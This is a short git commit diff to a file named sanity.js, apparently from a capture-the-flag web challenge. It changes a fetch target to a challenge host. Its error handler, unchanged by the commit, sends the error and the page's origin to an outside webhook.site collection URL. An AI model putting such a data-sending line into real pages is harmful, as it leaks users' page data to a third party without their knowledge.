ac20aa7c2776c7356084a82460dfeb48b083bd35
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 13:32:21 +0300

    Update sanity.js

--- sanity.js
+++ sanity.js
@@ -1,5 +1,5 @@
 try{
-  var a = await fetch("/")
+  var a = await fetch("https://1bba152fa531f3b03766f402-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/")
 }catch(err){
   await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err+document.location.origin,{"mode":"cors"});
 }
